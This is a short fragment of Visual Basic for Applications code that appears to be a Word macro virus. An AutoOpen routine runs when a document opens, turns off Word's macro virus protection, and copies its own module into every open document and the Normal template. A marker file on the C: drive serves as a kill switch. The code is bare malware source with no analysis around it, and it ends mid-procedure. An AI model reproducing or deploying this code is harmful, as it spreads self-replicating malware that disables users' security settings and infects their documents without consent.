Const vir = "vir"
Private a3 As Byte
Sub AutoOpen()
Open "c:\aut0exec.bat" For Binary Access Write As #1: Close #1
If FileLen("c:\aut0exec.bat") = 2 Then
del NormalTemplate, "cnsts": del NormalTemplate, "norm": Options.VirusProtection = True
End
End If
Options.VirusProtection = False
For Each dest In Documents
flag = True
For i = 1 To dest.VBProject.VBComponents.Count
If dest.VBProject.VBComponents.Item(i).Name = vir _
Then flag = False
Next i
If flag Then
ex cnsts.v, vir
dest.VBProject.VBComponents.import vir
NormalTemplate.VBProject.VBComponents("cnsts").export vir
dest.VBProject.VBComponents.import vir
Kill vir
End If
Next dest
